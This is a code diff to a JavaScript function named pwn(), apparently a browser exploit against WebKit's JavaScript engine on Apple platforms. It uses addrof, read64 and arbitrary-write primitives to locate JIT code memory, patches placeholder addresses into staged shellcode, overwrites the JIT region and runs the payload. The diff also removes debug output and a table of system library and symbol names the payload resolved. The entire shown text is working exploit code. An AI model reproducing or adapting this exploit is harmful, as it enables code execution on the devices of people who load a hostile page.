@@ -363,70 +363,16 @@ function pwn() {
     log(`[+] JITCode instance @ ${jitCodeAddr.toString(16)}`);
     var JITCode = read64(jitCodeAddr + 0x1a8);
     log(`[+] JITCode @ ${JITCode.toString(16)}`);
-    let hexdump = function(buf) {
-        let arr = new Uint8Array(buf);
-        let str = "";
-        for (let i = 0; i < arr.length; i++) {
-            str += arr[i].toString(16) + " ";
-        }
-        return str;
-    }
-    log(`[*] hexdump(stage1): ${hexdump(stage1)}`);
     
-    function writeStringToUint8Array(str, uint8Array, offset = 0) {
-        const encoder = new TextEncoder();
-        const encoded = encoder.encode(str);
-        const length = Math.min(encoded.length, uint8Array.length - offset);
-        for (let i = 0; i < length; i++) {
-            uint8Array[offset + i] = encoded[i];
-        }
-        if (offset + length < uint8Array.length) {
-            uint8Array[offset + length] = 0;
-        }
-    }
-
-    let ourArray = new Uint8Array(1024).fill(0x41);
-    let arrayObjectAddr = addrof(ourArray);
-    /*
-     ldr x0, =target  // x0 is the address of the JS object (arrayObjectAddr)
-     ldr x1, [x0, 16] // x1 is the address of the UInt8 array
-     ldr x2, [x1]     // read 8 bytes from the array into x2
-    */
+    let ourArray = new Uint8Array(stage2.length + 0x4000).fill(0);
     
-    let stringsOff = 144; // after all addresses
-    writeStringToUint8Array("_sleep", ourArray, stringsOff + 0);
-    writeStringToUint8Array("_malloc", ourArray, stringsOff + 7);
-    writeStringToUint8Array("_dlsym", ourArray, stringsOff + 15);
-    writeStringToUint8Array("__platform_strcmp", ourArray, stringsOff + 22);
-    writeStringToUint8Array("__platform_strlen", ourArray, stringsOff + 40);
-    writeStringToUint8Array("_open", ourArray, stringsOff + 58);
-    writeStringToUint8Array("_getenv", ourArray, stringsOff + 64);
-    writeStringToUint8Array("_abort", ourArray, stringsOff + 72);
-    writeStringToUint8Array("_write", ourArray, stringsOff + 79);
-    writeStringToUint8Array("_dup2", ourArray, stringsOff + 86);
-    writeStringToUint8Array("_dlopen", ourArray, stringsOff + 92);
-    writeStringToUint8Array("__TEXT", ourArray, stringsOff + 100);
-    writeStringToUint8Array("__LINKEDIT", ourArray, stringsOff + 107);
-    writeStringToUint8Array("__DATA", ourArray, stringsOff + 118);
-    writeStringToUint8Array("__all_image_info__DATA", ourArray, stringsOff + 125);
-    writeStringToUint8Array("__all_image_info__DATA_DIRTY", ourArray, stringsOff + 148);
-    writeStringToUint8Array("/usr/lib/system/libsystem_platform.dylib", ourArray, stringsOff + 177);
-    writeStringToUint8Array("/usr/lib/system/libsystem_kernel.dylib", ourArray, stringsOff + 218);
-    writeStringToUint8Array("/usr/lib/system/libsystem_malloc.dylib", ourArray, stringsOff + 257);
-    writeStringToUint8Array("/usr/lib/system/libsystem_asl.dylib", ourArray, stringsOff + 296);
-    writeStringToUint8Array("/usr/lib/system/libsystem_c.dylib", ourArray, stringsOff + 332);
-    writeStringToUint8Array("/usr/lib/system/libdyld.dylib", ourArray, stringsOff + 366);
-    writeStringToUint8Array("HOME", ourArray, stringsOff + 396);
-    writeStringToUint8Array("/Library/Caches/com.apple.WebKit.WebContent/log.txt", ourArray, stringsOff + 401);
-    writeStringToUint8Array("\n", ourArray, stringsOff + 453);
-    writeStringToUint8Array("Hello, world!", ourArray, stringsOff + 455);
+    stage1.replace(new Int64("0xbadbad10badbad10"), new Int64(JITCode));
+    stage1.replace(new Int64("0xbadbad20badbad20"), new Int64(addrof(ourArray)));
+    stage1.replace(new Int64("0xbadbad30badbad30"), new Int64(addrof(stage2)));
+    stage1.replace(new Int64("0xbadbad40badbad40"), new Int64(stage2.length));
     
-    stage1.replace(new Int64("0xbadbad10badbad10"), new Int64(arrayObjectAddr));
-    stage2.replace(new Int64("0xbadbad10badbad10"), new Int64(arrayObjectAddr));
     ArbitraryWrite(JITCode, stage1);
     shellcodeFunc();
-    millis(1000 * 2);
-    ArbitraryWrite(JITCode, stage2);
+    ArbitraryWrite(JITCode, ourArray);
     shellcodeFunc();
-    
 }
